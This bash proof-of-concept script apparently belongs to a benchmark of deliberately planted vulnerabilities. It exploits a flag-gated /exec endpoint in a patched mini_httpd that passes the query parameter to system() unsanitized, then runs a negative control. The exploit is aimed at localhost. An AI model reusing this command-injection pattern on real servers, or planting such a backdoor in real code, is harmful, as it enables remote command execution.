#!/usr/bin/env bash
# PoC for 034_mini_httpd_C3I1S1
# Axes: C3 (three-flag gate + exec_is_ready()) / I1 (direct to system()) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (mini_httpd) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh
#
# No sanitization — payload passes directly to system().

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/mini_httpd"
WWWROOT="/tmp/poc_034_www"
MARKER="/tmp/poc_034_marker"
PORT=18034
NEG_PORT=19034

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server with exec flags ─────────────────────────────────────────────
echo "[*] starting mini_httpd with --exec-mode --exec-logging --exec-init on port $PORT..."
"$BINARY" -p "$PORT" -d "$WWWROOT" -D --exec-mode --exec-logging --exec-init &
SERVER_PID=$!
sleep 0.5

# ── trigger ──────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.2

# ── verify ───────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without all three flags ─────────────────────────────
echo "[*] verifying gate: endpoint must be absent without all three flags..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
"$BINARY" -p "$NEG_PORT" -d "$WWWROOT" -D &
SERVER_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without all three flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
